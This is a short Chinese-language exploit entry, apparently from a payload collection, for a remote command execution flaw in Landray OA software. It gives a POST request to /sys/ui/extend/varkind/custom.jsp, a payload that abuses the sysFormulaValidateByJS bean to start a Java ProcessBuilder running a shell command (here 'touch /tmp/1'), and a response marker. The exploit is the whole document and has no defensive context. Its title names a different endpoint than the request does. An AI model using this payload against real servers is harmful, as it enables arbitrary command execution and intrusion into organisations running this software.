# 蓝凌oasysSearchMain.do远程代码执行漏洞

蓝凌oasysSearchMain.do远程 ｜ 命令执行 ｜ —
- **请求**：`POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1`

**Payload**
```
var={"body":{"file":"/data/sys-common/datajson"}}&s_bean=sysFormulaValidateByJS&script=new java.lang.ProcessBuilder['(java.lang.String[])'](['sh','-c','touch /tmp/1']).start();
```
- **响应特征**：-1